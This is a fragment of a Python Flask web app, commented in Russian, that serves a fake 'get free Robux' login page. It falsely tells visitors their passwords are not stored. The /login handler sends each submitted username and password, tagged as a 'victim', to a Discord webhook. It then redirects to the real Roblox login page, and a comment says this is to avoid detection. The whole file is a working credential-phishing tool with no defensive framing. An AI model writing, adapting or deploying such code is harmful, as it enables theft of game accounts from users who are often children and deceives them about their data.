        </style>
    </head>
    <body>
        <div class="box">
            <h2>🎮 Войди, чтобы получить робуксы</h2>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Логин" required><br>
                <input type="password" name="password" placeholder="Пароль" required><br>
                <button type="submit">Войти</button>
            </form>
            <p class="small">Мы не храним пароли, это просто проверка</p>
        </div>
    </body>
    </html>
    '''
    return html

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', 'не указан')
    password = request.form.get('password', 'не указан')
    
    # Отправляем в Discord
    msg = f"🎯 **Жертва**: {username}\n🔑 **Пароль**: {password}"
    try:
        requests.post(WEBHOOK_URL, json={'content': msg}, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки: {e}")
    
    # Редирект на настоящий Roblox, чтобы не спалиться
    return redirect('https://www.roblox.com/login')

@app.route('/health')
def health():
    return 'ok', 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
